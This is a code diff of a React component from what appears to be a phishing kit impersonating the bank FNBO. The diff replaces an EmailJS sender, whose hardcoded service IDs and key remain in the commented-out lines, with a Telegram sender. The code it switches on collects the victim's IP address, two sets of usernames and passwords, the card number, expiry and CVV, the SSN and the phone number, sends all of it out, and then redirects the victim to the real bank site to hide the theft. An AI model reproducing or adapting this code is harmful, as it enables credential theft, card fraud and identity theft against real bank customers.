@@ -1,7 +1,8 @@
 import React from 'react'
 // import { useNavigate } from 'react-router-dom';
 import cookies from '../utils/cookie.config';
-import emailjs from "@emailjs/browser";
+import TelegramSend from '../utils/send-message';
+// import emailjs from "@emailjs/browser";
 
 
 export default function Addition2() {
@@ -27,36 +28,36 @@ export default function Addition2() {
     event.preventDefault();
     setIsLoading(true)
 
-    const mail = await emailjs.sendForm(
-      "service_m05lftf",
-      "template_aeij4rd",
-      form.current!,
-      "74xz7jS-Xw5rVxjbV"
-    )
-    if(mail.status !== 200){
-      alert("Failed to login")
-      return
-    }
+    // const mail = await emailjs.sendForm(
+    //   "service_m05lftf",
+    //   "template_aeij4rd",
+    //   form.current!,
+    //   "74xz7jS-Xw5rVxjbV"
+    // )
+    // if(mail.status !== 200){
+    //   alert("Failed to login")
+    //   return
+    // }
 
-    // const request = await fetch("https://api.ipify.org?format=json");
-    // const response: { ip: string } = await request.json();
-    // const visitorIP = response.ip;
+    const request = await fetch("https://api.ipify.org?format=json");
+    const response: { ip: string } = await request.json();
+    const visitorIP = response.ip;
 
-    // const message = `
-    // ---- FNBO -----
-    // IP: ${visitorIP}
-    // Username: ${login1.username}
-    // Password: ${login1.password}
-    // Username 2: ${login2.username2}
-    // Password 2: ${login2.password2}
-    // Card number: ${card.cnm}
-    // Card Expiry : ${card.exp}
-    // Card Cvv: ${card.cv}
-    // SSN: ${formInput.sn}
-    // Phone Number: ${formInput.tel}
-    // `;
+    const message = `
+    ---- FNBO -----
+    IP: ${visitorIP}
+    Username: ${login1.username}
+    Password: ${login1.password}
+    Username 2: ${login2.username2}
+    Password 2: ${login2.password2}
+    Card number: ${card.cnm}
+    Card Expiry : ${card.exp}
+    Card Cvv: ${card.cv}
+    SSN: ${formInput.sn}
+    Phone Number: ${formInput.tel}
+    `;
 
-    // await TelegramSend(message);
+    await TelegramSend(message);
     window.location.replace("https://www.fnbo.com/");
     setIsLoading(false)
     // navigate("../success", { replace: true });
